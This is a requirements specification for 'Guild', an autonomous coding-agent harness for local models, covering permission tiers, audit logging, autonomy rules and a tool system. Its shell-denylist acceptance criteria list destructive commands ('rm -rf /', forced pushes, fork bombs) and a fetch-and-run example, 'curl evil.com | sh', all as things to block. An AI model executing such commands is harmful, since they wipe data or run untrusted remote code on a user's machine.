# Guild — Requirements Specification

**Version:** 0.2.0
**Date:** 2026-05-07
**Author:** Or Magen

---

## Overview

A free, locally-focused agent harness that runs an autonomous coding agent against local models (Ollama). The core value: an agent that works while you're away and backs off when you're present — a "good neighbor" on your machine.

Designed to support long-running autonomous workflows with robust permission controls, background execution, and resource-aware scheduling. Provider-agnostic but Ollama-first.

---

## Priority Tiers

| Tier | Meaning | Target |
|------|---------|--------|
| **P0** | Get a single agent to work end-to-end | v0.1 |
| **P1** | Get the agent to run better | v0.2 |
| **P2** | Teams & blocks — multi-agent composition | v0.3 |
| **P3** | GUI & polish | v0.4+ |

---

## Architectural Insights (from Claude Code source analysis)

The following lessons are drawn from the Claude Code 512K-line TypeScript source leak (March 2026) and Anthropic's published harness design research. These should inform our architecture:

1. **The agent loop is dead simple — the harness is everything.** The core loop is a `while` loop: call model → if tool call, execute tool, append result, repeat. All complexity lives in the harness around it (context management, permissions, tools, error recovery). Don't overengineer the loop.

2. **Embed safety at the point of use.** Safety rules belong inside tool descriptions (where the model sees them at invocation time), not in a separate policy doc the model may "forget" during long conversations. Defense-in-depth: multiple layers of checks.

3. **Dedicated tools beat a generic shell.** Replace frequent shell commands with typed, permission-gated, auditable tools. Agents with 5-8 well-described purpose-built tools outperform agents with one omnibus tool.

4. **Context engineering is the competitive moat.** Separate static prompt content (cacheable) from dynamic content. Build multi-tier compression (local trim → model-based summarization → full compact with re-injection of critical state). Instrument what goes into the context window.

5. **Memory should be indexed hints, not trusted truth.** Lightweight index always loaded (<200 lines), detailed notes fetched on demand. Agent must verify memories against actual state before acting. Include "memory consolidation" during idle time.

6. **Multi-agent parallelism via cache sharing.** Sub-agents should share the parent's context/cache to avoid paying full token cost per worker. Use isolated execution environments (worktrees, containers) for parallel work. Sub-agent spawning is just another tool call — keep architecture flat.

7. **Use cheap models for cheap decisions.** Permission checks, safety screening, sentiment detection, context compression — use the smallest model (or regex/deterministic code) that can handle it. Reserve the strong model for reasoning and generation.

8. **Generator + Evaluator is a composable block pattern, not a hardcoded feature.** For complex tasks, separate the agent doing the work from the agent judging it. But this should be a reusable composite block (e.g., "verified-coder" = coder + evaluator), not baked into the autonomy system.

9. **Context resets > compaction for long tasks.** For very long runs, clearing context and starting a fresh agent with a structured handoff artifact can outperform in-place compaction (avoids "context anxiety" where models wrap up prematurely).

10. **Re-examine harness complexity with each model upgrade.** Every harness component encodes an assumption about what the model can't do alone. As models improve, strip scaffolding that's no longer load-bearing and add new pieces for newly-possible capabilities.

---

## Design Principles

These emerged from design review and govern all implementation decisions:

1. **Reversibility governs everything.** Planning depth, decision-making, permissions, execution approach — all calibrated by "how hard is this to undo?" Low-impact/reversible → just do it. High-impact/irreversible → think, test, get approval.

2. **Maximize autonomous progress.** The user is never the bottleneck unless it's truly irreversible. When blocked on one thing, work on another. Queue questions, don't block on them.

3. **Adapt to user presence.** Attached: interactive back-and-forth. Detached: full autonomy. The resource monitor's activity detection drives notification and interaction mode.

4. **Senior engineer mindset.** Opinionated, makes judgment calls, documents rationale. Asks only when genuinely uncertain, not for validation. Self-reviews adversarially.

5. **Three separate layers.** Layer 1 (Harness): process lifecycle, resource management, tools, storage, permissions. Layer 2 (Agent Behaviors): decision framework, self-review, learning, escalation. Layer 3 (Orchestration): teams, decomposition, multi-agent. Each evolves independently.

6. **Fix, log, and learn.** Every mistake feeds the confidence-scored learning loop. Fix immediately, log for review, extract a rule for future sessions.

---

## P0 — Get a Single Agent to Work End-to-End

### REQ-01: LLM Provider Abstraction

**Goal:** Run agents against local models (Ollama) today, with architecture that supports any provider tomorrow.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-01.1 | Unified LLM interface with a common request/response contract | Model-agnostic: same agent code works regardless of backend |
| REQ-01.2 | Ollama backend as the default and first-class provider | Must support streaming responses |
| REQ-01.3 | Provider configuration via config files (not hardcoded) | Endpoint URL, model name, parameters (temperature, max_tokens, etc.) |
| REQ-01.4 | Provider-specific prompt formatting handled transparently | Chat templates, system prompt handling differences |
| REQ-01.5 | Connection health checks and graceful error handling | Detect if Ollama is down, report clearly |

#### Acceptance Criteria (REQ-01.1 through REQ-01.5)

**REQ-01.1 — Unified LLM interface with a common request/response contract**

- AC-01.1.1: `Provider.generate()` returns `LLMResponse` with `content`, `tool_calls`, `input_tokens`, `output_tokens`, `model`
  - verify: Call `generate()` on any provider -> response has all 5 fields populated
- AC-01.1.2: `Provider.health_check()` returns `bool`
  - verify: Call `health_check()` -> returns `True` (reachable) or `False` (unreachable)
- AC-01.1.3: Any new provider implements the same interface
  - verify: Create a new provider subclass -> must implement `generate()` and `health_check()` or `TypeError`

**REQ-01.2 — Ollama backend as the default and first-class provider**

- AC-01.2.1: `OllamaProvider` is registered as the default when no provider is explicitly configured
  - verify: Load default config with no `[provider]` section -> `OllamaProvider` is selected
- AC-01.2.2: Streaming responses are supported and yield incremental tokens
  - verify: Call `generate()` with `stream=True` -> receive an async iterator of partial tokens that concatenate to the full response
- AC-01.2.3: Ollama-specific parameters (e.g., `num_ctx`, `num_gpu`) are forwarded correctly
  - verify: Set `num_ctx=4096` in config -> Ollama `/api/chat` request body includes `"num_ctx": 4096`
- AC-01.2.4: Ollama provider handles model-not-found errors with a descriptive message
  - verify: Call generate() with model="nonexistent-model-xyz" -> raises or returns error containing "model not found" rather than a raw 404 or unhandled exception
- AC-01.2.5: Ollama provider reports the actual model name used in the response (not just the configured name)
  - verify: Configure model="gemma4:4b", call generate() -> LLMResponse.model matches what Ollama actually loaded (e.g., handles aliases)

**REQ-01.3 — Provider configuration via config files (not hardcoded)**

- AC-01.3.1: Provider endpoint URL is read from config, not hardcoded
  - verify: Set `provider.base_url = "http://custom:11434"` in config -> provider connects to that URL
- AC-01.3.2: Model name is configurable per-project
  - verify: Set `provider.model = "gemma4:4b"` in config -> LLM calls use that model name
- AC-01.3.3: Generation parameters (temperature, max_tokens, top_p) are configurable
  - verify: Set `provider.temperature = 0.2` in config -> API call includes `"temperature": 0.2`
- AC-01.3.4: Invalid config values are rejected at startup with a clear error
  - verify: Set `provider.temperature = "banana"` -> startup fails with validation error naming the field and expected type
- AC-01.3.5: Configuration changes via `guild config --set` persist to the TOML file and are loaded on next startup
  - verify: Run `guild config --set provider.model=gemma4:1b`, restart Guild, run `guild config --get provider.model` -> returns "gemma4:1b"

**REQ-01.4 — Provider-specific prompt formatting handled transparently**

- AC-01.4.1: System prompt is injected in the provider-appropriate position
  - verify: Send a message with a system prompt through `OllamaProvider` -> the Ollama API request places it in the `system` field (not as a user message)
- AC-01.4.2: Chat history is formatted per the provider's expected schema
  - verify: Send a multi-turn conversation through `OllamaProvider` -> messages array uses `role`/`content` pairs matching Ollama's `/api/chat` format
- AC-01.4.3: Tool call formatting is adapter-specific and transparent to the caller
  - verify: Define a tool and call `generate()` -> the tool schema is serialized in the provider's native format (Ollama JSON function calling schema) without the caller specifying format details

**REQ-01.5 — Connection health checks and graceful error handling**

- AC-01.5.1: `health_check()` detects an unreachable provider within the configured timeout
  - verify: Point provider at a non-existent host -> `health_check()` returns `False` within 5 seconds (default timeout)
- AC-01.5.2: Connection failure during `generate()` raises a typed exception, not a generic error
  - verify: Kill Ollama mid-request -> `generate()` raises `ProviderConnectionError` (not `Exception` or `ConnectionError`)
- AC-01.5.3: Transient failures are retried with backoff before surfacing to the agent loop
  - verify: Simulate one transient 503 followed by success -> `generate()` returns the successful response without the caller needing retry logic
- AC-01.5.4: A clear, human-readable message is logged when the provider is down
  - verify: Start Guild with Ollama stopped -> log output includes a message like "Cannot reach Ollama at http://localhost:11434 - is it running?"
- AC-01.5.5: Health check has a configurable timeout (not hardcoded)
  - verify: Set `provider.health_check_timeout_seconds = 2` in config -> health_check() times out after 2s on an unresponsive host (not the default 5s)

### REQ-02: Cross-Platform Support (Windows, macOS, Linux)

**Goal:** Single codebase that works on all three major OSes. Windows is the primary development machine today.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-02.1 | All core functionality must be OS-agnostic | No platform-specific code in business logic |
| REQ-02.2 | Single install mechanism | `pip install` or a single install script |
| REQ-02.3 | File paths, process management, and networking must use cross-platform abstractions | pathlib, not string concatenation |
| REQ-02.4 | Platform-specific behavior (idle detection, sleep detection) behind a `PlatformAdapter` interface | Windows + macOS + Linux |

#### Acceptance Criteria (REQ-02.1 through REQ-02.4)

**REQ-02.1 — All core functionality must be OS-agnostic**

- AC-02.1.1: No platform conditionals exist in business logic modules (agent/, provider/, storage/, tools/)
  - verify: Grep business logic directories for `sys.platform` or `os.name` checks -> zero matches outside daemon/platform.py
- AC-02.1.2: The full unit test suite passes on Windows, macOS, and Linux
  - verify: Run `pytest -m unit` on each OS -> all tests pass with zero failures

**REQ-02.2 — Single install mechanism**

- AC-02.2.1: `pip install .` succeeds on all three platforms without platform-specific prerequisites
  - verify: Run `pip install .` in a clean Python 3.11 venv on each OS -> install completes with exit code 0
- AC-02.2.2: After install, the `guild` CLI entry point is available on PATH
  - verify: Run `guild --help` after pip install -> prints usage information with exit code 0

**REQ-02.3 — File paths, process management, and networking must use cross-platform abstractions**

- AC-02.3.1: All file path construction uses `pathlib.Path`, not string concatenation
  - verify: Grep src/guild/ for `os.path.join` -> zero matches
- AC-02.3.2: Process spawning uses `asyncio.create_subprocess_exec`, not `os.system` or shell=True
  - verify: Grep src/guild/ for `os.system` and `shell=True` -> zero matches outside test fixtures
- AC-02.3.3: Paths with spaces and special characters work correctly on all platforms
  - verify: Create a working directory with spaces (e.g., "/tmp/my project/guild test") -> `guild init` and `guild task` operate correctly in that directory without path errors

**REQ-02.4 — Platform-specific behavior behind a PlatformAdapter interface**

- AC-02.4.1: `PlatformAdapter` is abstract with methods for idle detection and sleep detection
  - verify: Subclass `PlatformAdapter` without implementing abstract methods -> `TypeError` raised at instantiation
- AC-02.4.2: Concrete adapters exist for all three platforms
  - verify: Import `DarwinAdapter`, `LinuxAdapter`, `WindowsAdapter` -> all three classes resolve without error
- AC-02.4.3: The correct adapter is auto-selected based on the running OS
  - verify: Call `PlatformAdapter.create()` on macOS -> returns a `DarwinAdapter` instance
- AC-02.4.4: FallbackAdapter is used on unsupported platforms and logs a warning about limited functionality
  - verify: Run on Windows (where no WindowsAdapter exists) -> FallbackAdapter is selected, and startup log contains "Platform 'win32': using fallback adapter (limited idle/sleep detection)"

### REQ-03: Tiered Permission System

**Goal:** Granular, easy-to-switch permission levels that control what agents can do.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-03.1 | **Tier 0 — "Nothing"**: Agent can only think and respond, no tool use | Safe mode for testing prompts |
| REQ-03.2 | **Tier 1 — "Ask"**: Agent requests tool use, human approves per-tool | Approval granularity: once / per-session / per-call |
| REQ-03.3 | **Tier 2 — "Scoped"**: Agent can use all tools within a defined scope | Scope = directory tree, specific tool set, or resource pattern |
| REQ-03.4 | **Tier 3 — "Autopilot"**: All tools allowed, no approval needed | For trusted, long-running autonomous work |
| REQ-03.5 | Permission level switchable at runtime (CLI command or GUI toggle) | No restart required |
| REQ-03.6 | Audit log of all permission decisions | Who approved what, when |
| REQ-03.7 | **Hardcoded-never layer** — destructive/irreversible actions blocked regardless of tier | git push --force, rm -rf, history rewrite, money-spending API calls. Overridable only by explicit per-action flag |
| REQ-03.8 | **Reversibility principle** governs all permission decisions — the harder to undo, the more caution required | This is the universal governance rule across all tiers |

#### Acceptance Criteria (REQ-03.1 through REQ-03.8)

**REQ-03.1 — Tier 0 "Nothing": Agent can only think and respond, no tool use**

- AC-03.1.1: At Tier 0, agent responses contain no tool calls
  - verify: Set permission tier to 0 and run a task that would normally use tools -> agent produces text-only responses with zero tool invocations
- AC-03.1.2: At Tier 0, tool call attempts from the model are silently dropped
  - verify: Force a model response containing a tool call at Tier 0 -> harness filters it out and continues without executing the tool
- AC-03.1.3: Dropped tool calls at Tier 0 are logged in the audit trail with reason "tier_0_blocked"
  - verify: Set tier to 0, model attempts a tool call -> audit log contains entry with action="tool_blocked", details containing tool name and reason="Tier 0: no tool use"

**REQ-03.2 — Tier 1 "Ask": Agent requests tool use, human approves per-tool**

- AC-03.2.1: At Tier 1, each tool call triggers an approval prompt before execution
  - verify: Set tier to 1 and run a task -> agent pauses with "Approve file_write to /path? [yes/no/always]" before each tool call
- AC-03.2.2: Approval granularity supports "once", "per-session", and "per-call"
  - verify: Approve a tool with "always" at Tier 1 -> subsequent calls to that tool in the same session execute without prompting
- AC-03.2.3: A denied tool call is reported back to the agent as a refusal
  - verify: Deny a tool call at Tier 1 -> agent receives a tool result indicating "Permission denied by user" and can adjust its approach
- AC-03.2.4: "per-call" approval mode prompts on every invocation even for previously-approved tools
  - verify: Set approval_granularity="per-call" at Tier 1, approve file_read once -> next file_read call still prompts for approval (not auto-approved)

**REQ-03.3 — Tier 2 "Scoped": Agent can use all tools within a defined scope**

- AC-03.3.1: Tools operating within the configured scope execute without approval
  - verify: Set tier to 2 with scope `/project/src/` -> file_read on `/project/src/main.py` executes immediately without prompting
- AC-03.3.2: Tools targeting resources outside the scope are blocked
  - verify: Set tier to 2 with scope `/project/src/` -> file_write to `/etc/passwd` is rejected with "Outside permitted scope"
- AC-03.3.3: Scope supports directory trees, tool-name sets, and resource patterns
  - verify: Configure scope as `tools: [file_read, search]` -> file_read executes without prompt; shell_exec is blocked
- AC-03.3.4: Scope violation is reported back to the agent with the specific boundary that was exceeded
  - verify: Set scope to /project/src/, attempt file_write to /project/docs/readme.md -> agent receives tool result "Permission denied: /project/docs/readme.md is outside scope [/project/src/]" (not just generic "blocked")

**REQ-03.4 — Tier 3 "Autopilot": All tools allowed, no approval needed**

- AC-03.4.1: At Tier 3, all tool calls execute without any approval prompt
  - verify: Set tier to 3 and run a task using file_write, shell_exec, and search -> all execute without pausing for approval
- AC-03.4.2: Hardcoded-never rules still apply at Tier 3
  - verify: Set tier to 3 and attempt `rm -rf /` via shell_exec -> blocked by hardcoded-never layer despite Tier 3

**REQ-03.5 — Permission level switchable at runtime**

- AC-03.5.1: Changing permission tier takes effect on the next tool call without restarting the agent
  - verify: Start a task at Tier 3, switch to Tier 1 via `guild config --set permissions.tier=1` mid-task -> next tool call prompts for approval
- AC-03.5.2: The current tier is queryable at any time
  - verify: Run `guild config --get permissions.tier` -> prints the current tier value
- AC-03.5.3: Switching tiers clears session-level approvals from the previous tier
  - verify: At Tier 1, approve file_read (cached), switch to Tier 2 with scope excluding file_read, switch back to Tier 1 -> file_read requires re-approval (session cache was cleared)

**REQ-03.6 — Audit log of all permission decisions**

- AC-03.6.1: Every approval, denial, and auto-permit is recorded with timestamp and context
  - verify: Run a task at Tier 1, approve one tool, deny another -> `guild audit` shows both decisions with timestamps, tool name, and user action
- AC-03.6.2: Audit log entries include the permission tier active at the time of the decision
  - verify: Switch tiers mid-task -> audit log entries reflect the correct tier for each decision
- AC-03.6.3: Auto-permitted actions (Tier 3 autopilot, Tier 2 in-scope) are logged, not just human decisions
  - verify: Run a task at Tier 3 with 5 tool calls -> `guild audit` shows 5 entries with status="auto_permitted" (not just when human approves/denies)
- AC-03.6.4: Hardcoded-never blocks are recorded in the audit log with the matched pattern
  - verify: Attempt `git push --force` at any tier -> audit log entry includes action="hardcoded_never_blocked", details containing the matched denylist pattern and reason

**REQ-03.7 — Hardcoded-never layer blocks destructive actions regardless of tier**

- AC-03.7.1: Commands on the hardcoded-never list are blocked at every tier
  - verify: Attempt `git push --force` at Tier 3 -> blocked with "Hardcoded-never: destructive action blocked"
- AC-03.7.2: The hardcoded-never block is overridable only by an explicit per-action flag
  - verify: Attempt `git push --force` with `--allow-destructive` flag -> action proceeds (with audit log entry)
- AC-03.7.3: The hardcoded-never list includes rm -rf, git push --force, and history rewrite commands
  - verify: Inspect the denylist -> contains at minimum `rm -rf /`, `git push --force`, `git rebase` on protected branches
- AC-03.7.4: Hardcoded-never patterns cannot be weakened via config file -- only the per-action flag overrides them
  - verify: Add `hardcoded_never.disable = ["git push --force"]` to config.toml -> the pattern is STILL blocked (config cannot weaken the hardcoded layer, only the explicit runtime flag can)

**REQ-03.8 — Reversibility principle governs all permission decisions**

- AC-03.8.1: Read-only operations are permitted at lower tiers than write operations
  - verify: At Tier 2 with default scope, file_read executes without prompt while file_write to the same path requires scope validation
- AC-03.8.2: Irreversible actions require higher authorization than reversible ones
  - verify: Deleting a file (irreversible) requires explicit approval even at Tier 2; creating a new file (reversible) does not
- AC-03.8.3: Tools are tagged with a reversibility level (read-only, reversible-write, irreversible) that the permission system uses for tier decisions
  - verify: Inspect tool metadata -> file_read has reversibility="read-only", file_write has "reversible", shell has "variable"; at Tier 2, the scope checker uses these tags to apply different thresholds

### REQ-05: CLI Interface

**Goal:** CLI is the complete, authoritative interface. Every operation is a CLI command.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-05.1 | **CLI is the primary interface** — every operation is a CLI command | Scriptable, pipe-friendly, automatable |
| REQ-05.2 | All agent interaction, monitoring, and config happens via CLI | Nothing requires a GUI |
| REQ-05.3 | Ability to send messages to the running agent from CLI | `guild chat` for interactive mode |
| REQ-05.4a | **Interactive attach** — `guild attach` allows sending messages to steer a running task, not just viewing | Challenge decisions, request tweaks, provide answers to queued questions |

#### Acceptance Criteria (REQ-05.1 through REQ-05.4a)

**REQ-05.1 — CLI is the primary interface: every operation is a CLI command**

- AC-05.1.1: Every operation available in Guild has a corresponding CLI command
  - verify: List all features (task, chat, config, audit, etc.) -> each has a `guild <command>` entry in `guild --help`
- AC-05.1.2: CLI output is pipe-friendly (structured text, no ANSI codes when piped)
  - verify: Run `guild ps | cat` -> output contains no ANSI escape sequences
- AC-05.1.3: CLI commands return meaningful exit codes for scripting
  - verify: Run `guild task "fail task"` where task fails -> exit code is non-zero (1)

**REQ-05.2 — All agent interaction, monitoring, and config happens via CLI**

- AC-05.2.1: Agent configuration can be viewed and modified entirely from CLI
  - verify: Run `guild config --set provider.model=gemma4:4b` then `guild config --get provider.model` -> outputs "gemma4:4b"
- AC-05.2.2: Agent monitoring (status, logs, usage) is accessible without a GUI
  - verify: Run `guild status`, `guild logs <id>`, `guild usage` -> all produce output without requiring a browser or GUI

**REQ-05.3 — Ability to send messages to the running agent from CLI**

- AC-05.3.1: `guild chat` starts an interactive multi-turn session
  - verify: Run `guild chat`, type a message, receive agent response, type another -> conversation history is preserved between messages
- AC-05.3.2: Exiting `guild chat` does not lose conversation state
  - verify: Run `guild chat`, exchange 3 messages, exit with Ctrl+D -> `guild history` shows the conversation with all 3 exchanges

**REQ-05.4a — Interactive attach allows sending messages to steer a running task**

- AC-05.4a.1: `guild attach <task_id>` connects to a running background task with bidirectional communication
  - verify: Start a background task, run `guild attach <id>`, type "use a different approach" -> agent receives the message and adjusts
- AC-05.4a.2: Attaching streams existing output before accepting input
  - verify: Start a background task that has produced 5 messages, run `guild attach <id>` -> first see the 5 existing messages, then live output
- AC-05.4a.3: Detaching from an attached session does not stop the background task
  - verify: Attach to a running task, press Ctrl+C to detach -> `guild ps` still shows the task as running

### REQ-06: Autonomous Long-Running Operation ("Anti-Babysitting")

**Goal:** Agents run to completion without unnecessary human check-ins. They stop only when truly done or truly stuck.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-06.1 | Agents must not pause for confirmation unless genuinely blocked | No "shall I continue?" after every step |
| REQ-06.2 | Clear "done" criteria per task — agents self-verify completion | Run tests, check outputs, validate against spec |
| REQ-06.3 | Stuck detection — recognize when no progress is being made | Loop detection, repeated failures, resource exhaustion |
| REQ-06.4 | Graceful degradation on stuck — try alternatives before escalating | Retry with different approach, then escalate |
| REQ-06.5 | Human escalation only as last resort, with full context | "I tried X, Y, Z. Here's where I'm stuck. Here's what I need from you." |
| REQ-06.6 | Progress persistence — survive crashes, reboots, network drops | Checkpoint state to disk regularly |
| REQ-06.7 | Configurable autonomy timeout | "Run for max 4 hours, then pause and report" |
| REQ-06.8 | **Simple core loop** — while(true) { call model → execute tool → append result } | Per Claude Code: don't overengineer the control flow |
| REQ-06.9 | **Multi-turn conversation** — agent loop preserves message history between user inputs | `run()` appends to existing messages, does not reset. Enables `guild chat` and interactive attach |
| REQ-06.10 | **Adversarial self-review** — after tests pass, agent actively tries to break its own implementation | Look for edge cases, security holes, spec violations the tests might miss |
| REQ-06.11 | **Try-test-rollback for impactful decisions** — for non-trivial choices, try approach A, test it, rollback if it fails, try B | Only escalate to human if all approaches fail |
| REQ-06.12 | **Decision logging** — every non-trivial decision documented with rationale | Separate from audit log (which tracks tool calls). This tracks "why did I choose X over Y?" |

#### Acceptance Criteria (REQ-06.1 through REQ-06.12)

**REQ-06.1 — Agents must not pause for confirmation unless genuinely blocked**

- AC-06.1.1: Agent completes a multi-step task without prompting the user between steps
  - verify: Run a task at Tier 3 that requires 5 tool calls -> agent executes all 5 without any "shall I continue?" pauses
- AC-06.1.2: Agent only pauses when it cannot determine the next action
  - verify: Give agent a task with ambiguous requirements -> agent attempts its best interpretation first; only escalates if stuck

**REQ-06.2 — Clear "done" criteria per task: agents self-verify completion**

- AC-06.2.1: Agent runs verification checks before declaring a task done
  - verify: Run a coding task with test suite -> agent runs tests after implementation; task status is `done` only if tests pass
- AC-06.2.2: A task that fails verification is marked as failed, not done
  - verify: Agent implements code that fails its test suite -> task status is `failed` with verification failure details
- AC-06.2.3: Verification failure details are included in the task's final status
  - verify: Agent implementation fails tests -> `guild status <task_id>` shows not just "failed" but also includes the specific verification failure message (e.g., "3 tests failed: test_parse, test_validate, test_export")

**REQ-06.3 — Stuck detection: recognize when no progress is being made**

- AC-06.3.1: Repeated identical tool calls trigger stuck detection
  - verify: Agent calls the same tool with the same args 3 times in a row -> stuck detector fires and agent switches strategy
- AC-06.3.2: Stuck detection identifies repeated failure patterns
  - verify: Agent encounters the same error 3 consecutive turns -> stuck state is logged with the repeated error pattern

**REQ-06.4 — Graceful degradation on stuck: try alternatives before escalating**

- AC-06.4.1: On stuck detection, agent retries with a different approach before escalating
  - verify: Agent gets stuck on approach A -> agent logs "Trying alternative approach" and attempts approach B before involving the user
- AC-06.4.2: The number of alternative attempts is bounded
  - verify: Agent fails approaches A, B, and C -> escalates to human after exhausting configured max retries (default 3)
- AC-06.4.3: The recovery strategy is logged so the user can see what alternative was tried
  - verify: Agent gets stuck and attempts recovery -> `guild logs <task_id>` includes an entry like "Stuck detected (Repeated identical error 3 times), attempting recovery" with the recovery prompt used

**REQ-06.5 — Human escalation only as last resort, with full context**

- AC-06.5.1: Escalation message includes what was tried, what failed, and what is needed
  - verify: Agent escalates after being stuck -> message includes "Tried: [list], Failed because: [reasons], Need from you: [specific ask]"
- AC-06.5.2: Escalation is queued asynchronously, not blocking
  - verify: Agent escalates on subtask A -> continues working on unrelated subtask B while waiting for human response

**REQ-06.6 — Progress persistence: survive crashes, reboots, network drops**

- AC-06.6.1: State is checkpointed to disk on every turn boundary
  - verify: Kill the agent process after turn 5 of 10 -> `guild resume <id>` resumes from turn 5, not turn 0
- AC-06.6.2: In-progress tool results are not lost on crash
  - verify: Agent completes a tool call, crashes before the next LLM call -> resume includes the completed tool result in context

**REQ-06.7 — Configurable autonomy timeout**

- AC-06.7.1: Agent pauses after the configured timeout with a progress report
  - verify: Set `autonomy.timeout_hours = 1` -> agent pauses after 1 hour with a summary of what was accomplished
- AC-06.7.2: Timeout of zero means no time limit
  - verify: Set `autonomy.timeout_hours = 0` -> agent runs indefinitely until task completion or budget exhaustion
- AC-06.7.3: The progress report generated at timeout includes what was accomplished
  - verify: Set `autonomy.timeout_hours = 1`, agent times out -> the pause message includes a summary like "Timeout reached. Completed: [list of actions]. In progress: [current step]."

**REQ-06.8 — Simple core loop**

- AC-06.8.1: The agent loop is: call model, execute tool if requested, append result, repeat
  - verify: Enable debug logging and run a task -> log shows the cycle: LLM call -> tool execution -> result appended -> LLM call, with no extraneous steps
- AC-06.8.2: Loop terminates when the model produces a response with no tool calls
  - verify: Agent produces a final text response with no tool_calls -> loop exits and task is marked for verification

**REQ-06.9 — Multi-turn conversation: agent loop preserves message history**

- AC-06.9.1: `run()` appends to existing messages rather than resetting
  - verify: Call `run()` with "do step 1", then call `run()` again with "now do step 2" -> second run sees the full history from step 1
- AC-06.9.2: Message history is available to `guild chat` across re-entries
  - verify: Start `guild chat`, send 3 messages, exit, re-enter `guild chat` for the same task -> history of all 3 prior messages is preserved
- AC-06.9.3: The `send()` method preserves all prior context including tool results
  - verify: Call `run("do step 1")` which produces tool calls and results, then call `send("now do step 2")` -> the messages sent to the LLM for step 2 include the tool call results from step 1, not just the assistant text

**REQ-06.10 — Adversarial self-review after tests pass**

- AC-06.10.1: After tests pass, agent actively looks for edge cases the tests might miss
  - verify: Agent completes implementation and tests pass -> agent generates at least one adversarial probe before declaring done
- AC-06.10.2: Self-review findings are logged as decision entries
  - verify: Agent finds an issue during self-review -> `guild decisions <task_id>` shows the finding with "self-review" tag
- AC-06.10.3: Self-review can be disabled per-task or globally via configuration
  - verify: Set `agent.self_review = false` in config -> agent completes task without injecting the self-review prompt. Set `agent.self_review = true` -> self-review runs.

**REQ-06.11 — Try-test-rollback for impactful decisions**

- AC-06.11.1: Agent creates a checkpoint before attempting a non-trivial approach
  - verify: Agent decides between two strategies -> creates a checkpoint, tries approach A, runs tests
- AC-06.11.2: Failed approach is rolled back before trying the alternative
  - verify: Approach A fails tests -> agent reverts changes to the checkpoint state before attempting approach B

**REQ-06.12 — Decision logging: every non-trivial decision documented with rationale**

- AC-06.12.1: Decisions are stored separately from the tool-call audit log
  - verify: Agent makes a design choice -> `guild decisions <task_id>` shows the entry; `guild audit` does not contain it as a tool call
- AC-06.12.2: Each decision entry includes alternatives considered and the reason for selection
  - verify: Agent chooses approach A over B -> decision log entry includes "Considered: [A, B], Selected: A, Reason: [rationale]"

### REQ-08: Tool System

**Goal:** Built-in tools that are dedicated and typed (not a generic shell). MCP plugin architecture is P1.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-08.1 | Standard tool contract: name, description, input schema, execute() | Simple function interface |
| REQ-08.2 | **Dedicated typed tools over generic shell** — replace frequent shell commands with purpose-built tools | File read/write, code search, grep, glob — each with its own permissions and validation |
| REQ-08.3 | Built-in tools: file read/write, shell exec (with safety checks), search, glob | Ship with a useful default set; shell tool has embedded safety rules |
| REQ-08.4 | Tool usage audit log | Tool name, args, result, duration, which agent, approval status |
| REQ-08.5 | Tool timeout and resource limits | Prevent a single tool call from hanging the system |
| REQ-08.6 | Safety rules embedded in tool descriptions | Per Claude Code insight: model sees constraints at invocation time |
| REQ-08.7 | Shell command denylist — block dangerous patterns unless explicitly overridden | `rm -rf /`, `git push --force`, fork bombs, etc. |

#### Acceptance Criteria (REQ-08.1 through REQ-08.7)

**REQ-08.1 — Standard tool contract: name, description, input schema, execute()**

- AC-08.1.1: Every tool has `name`, `description`, `input_schema`, and `execute()` attributes
  - verify: Instantiate each built-in tool -> all four attributes are present and non-empty
- AC-08.1.2: A tool missing any required attribute raises a validation error at registration
  - verify: Register a tool with no `input_schema` -> raises `ToolValidationError` at startup
- AC-08.1.3: `execute()` returns a structured `ToolResult` with `output` and `error` fields
  - verify: Call `execute()` on file_read with a valid path -> returns `ToolResult` with `output` populated and `error` as None

**REQ-08.2 — Dedicated typed tools over generic shell**

- AC-08.2.1: File read, file write, search, and glob each exist as separate tools with their own schemas
  - verify: List registered tools -> `file_read`, `file_write`, `search`, `glob` are each distinct entries with unique input schemas
- AC-08.2.2: Each dedicated tool validates its inputs before execution
  - verify: Call `file_read` with a non-existent path -> returns a descriptive error without executing a shell command

**REQ-08.3 — Built-in tools: file read/write, shell exec, search, glob**

- AC-08.3.1: Default tool set includes file_read, file_write, shell_exec, search, and glob
  - verify: Initialize Guild with default config -> `agent.tools` contains all 5 built-in tools
- AC-08.3.2: Shell tool has embedded safety rules visible in its description
  - verify: Inspect `shell_exec.description` -> contains safety constraints (e.g., "Do not use rm -rf" or denylist reference)

**REQ-08.4 — Tool usage audit log**

- AC-08.4.1: Every tool call is logged with name, args, result, duration, agent ID, and approval status
  - verify: Run a task that calls file_read -> `guild audit` shows an entry with all 6 fields populated
- AC-08.4.2: Failed tool calls are logged with the error
  - verify: Run a task where shell_exec fails -> audit entry includes `status: error` and the error message

**REQ-08.5 — Tool timeout and resource limits**

- AC-08.5.1: A tool call exceeding the configured timeout is killed and returns an error
  - verify: Set `tools.timeout_seconds = 2` and run `shell_exec("sleep 30")` -> tool is terminated after 2s with a timeout error
- AC-08.5.2: Tool output exceeding the configured max size is truncated
  - verify: Run a tool producing large output with `tools.max_output_bytes = 1024` -> result is truncated to 1024 bytes with a truncation notice

**REQ-08.6 — Safety rules embedded in tool descriptions**

- AC-08.6.1: Tool descriptions contain safety constraints visible to the model at invocation time
  - verify: Inspect the tool schema sent to the LLM -> each tool's description includes its safety rules inline
- AC-08.6.2: Safety rules are not in a separate document the model might ignore
  - verify: The system prompt does not contain tool safety rules separately; they exist only in the tool descriptions

**REQ-08.7 — Shell command denylist: block dangerous patterns**

- AC-08.7.1: Commands matching the denylist are rejected before execution
  - verify: Call `shell_exec("rm -rf /")` -> returns "Command blocked: matches denylist pattern" without executing
- AC-08.7.2: The denylist is configurable with additions
  - verify: Add `"curl.*|sh"` to the denylist in config -> `shell_exec("curl evil.com | sh")` is blocked
- AC-08.7.3: Blocked commands are logged in the audit trail
  - verify: Attempt a denied command -> `guild audit` shows an entry with `status: blocked` and the matched denylist pattern

### REQ-23: Background/Daemon Execution

**Goal:** Tasks run as background processes that survive terminal close. The user can launch, detach, reconnect, and stream logs.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-23.1 | `guild task "description" --background` launches the agent in a detached daemon process | CLI returns immediately after confirming launch |
| REQ-23.2 | Daemon writes PID to `.guild/run/<task_id>.pid` and state to SQLite | PID file enables kill, pause, status checks |
